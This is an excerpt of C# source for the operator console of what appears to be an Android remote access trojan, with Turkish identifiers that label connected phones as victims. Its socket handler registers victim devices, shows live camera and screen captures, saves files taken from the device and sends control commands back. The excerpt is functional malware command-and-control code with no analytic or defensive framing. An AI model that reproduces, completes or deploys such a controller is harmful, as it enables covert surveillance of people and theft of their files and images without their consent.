    ...
    */
    public partial class Form1 : Form
    {
        ...
        public class infoAl : IDisposable
        {
            ...
            public async void endRead(IAsyncResult ar)
            {
                try
                {
                    ...
                    await Task.Delay(5); // reduce high cpu usage. :)
                    ...
                    for (int k = 0; k < filebytes.Length - 1; k++)
                    {
                        try
                        {
                            ...
                            if (isContainsEof)
                            {
                                ...
                                tmp_form.DataInvoke(sck, whatsTag, filebytes[k]); // Process our datas as tag and buffer data.
        ...
        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver, string wallpaper)
        {
        ...
        public async void DataInvoke(Socket soket2, string tag, byte[] dataBuff)
        {
            try
            {
                switch (tag.Split('|')[0])
                {
                    case "<MYIP>":
                        Invoke((MethodInvoker)delegate
                        {
                            try
                            {
                                ...
                                Ekle(soket2, soket2.Handle.ToString(), s_[1], s_[2], s_[3], s_[4], s_[5]);
                            }
                            catch (Exception) { }
                        });
                        break;
                    ...
                    case "<VID>":
                        ...
                        try
                        {
                            if (shortcam != null)
                            {
                                shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(dataBuff));
                    ...
                    case "<DOSYAALINDI>":
                        if (FindFileManagerById(soket2.Handle.ToString()) != null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                FindFileManagerById(soket2.Handle.ToString()).yükleToolStripMenuItem.Enabled = true;
                                FindFileManagerById(soket2.Handle.ToString()).toolStripProgressBar1.Value = 0;
                                ...
                                FindFileManagerById(soket2.Handle.ToString()).listBox1.Items.Add(DateTime.Now.ToString() + " - File has been successfully received. ==> " + Encoding.UTF8.GetString(dataBuff));
                            });
                        }
                    ...
                    case "<UZUNLUK>":
                        ...
                        // when i'm sick of code bugs;
                        //https://www.youtube.com/watch?v=JIMQsnYAc4A

                        var fman = FindFileManagerById(soket2.Handle.ToString()); // size[NAME]filename.                      
                        int maxLen = int.Parse(tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[0]);
                        string dosyaAdi = tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[1]
                        .Split(new string[] { "[VERI]" }, StringSplitOptions.None)[1];
                        string id = tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[1]
                        .Split(new string[] { "[VERI]" }, StringSplitOptions.None)[2].Replace(">", "");

                        if (!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + id))
                        {
                            Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + id);
                        }
                        try
                        {
                            fman.mysb.Write(dataBuff, 0, dataBuff.Length);

                            Invoke((MethodInvoker)delegate
                            {
                                fman.label6.Text = GetFileSizeInBytes(fman.mysb.ToArray().Length) + "/" + GetFileSizeInBytes(maxLen);
                            });

                            if (fman.mysb.ToArray().Length == maxLen)
                            {
                                File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + id + "\\"
                                + dosyaAdi, fman.mysb.ToArray());
                                ...
                                Invoke((MethodInvoker)delegate
                                {
                                    fman.indirToolStripMenuItem1.Enabled = true;
                                    fman.label6.Text = "...";
                                    fman.toolStripStatusLabel1.Text = "...";
                                    fman.toolStripProgressBar1.Style = ProgressBarStyle.Blocks;
                                    fman.toolStripProgressBar1.Value = 0;
                                    fman.indirToolStripMenuItem.Enabled = true;
                                    fman.listBox1.Items.Add(DateTime.Now.ToString() + " - File downloaded: " + dosyaAdi);
                                    FindFileManagerById(soket2.Handle.ToString()).Text = "File Manager - " + krbnIsminiBul(soket2.Handle.ToString()); ;
                                });
                            }
                        ...
                        catch (Exception ex)
                        {
                            if (fman != null)
                            {
                                MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), ex.ToString(), "Download Warning " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }
                        break;
                    ...
                    case "<LIVESCREEN>":
                        ...
                        if (canliekran != null)
                        {
                            canliekran.pictureBox1.Image = ((Image)new ImageConverter().ConvertFrom(StringCompressor.Decompress(dataBuff)));
                        }
                        else
                        {
                            try
                            {
                                byte[] senddata = Form1.MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
                                soket2.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                            }
                            catch (Exception) { }
                        }
                        break;
        ...
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar krbn in kurban_listesi.ToList())
            {
                ...
                catch (Exception)
                {
                    ...
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.soket.Handle.ToString() + " connection of this socket has closed. => " + victim.Cells[1].Value.ToString() + "/" + victim.Cells[2].Value.ToString());
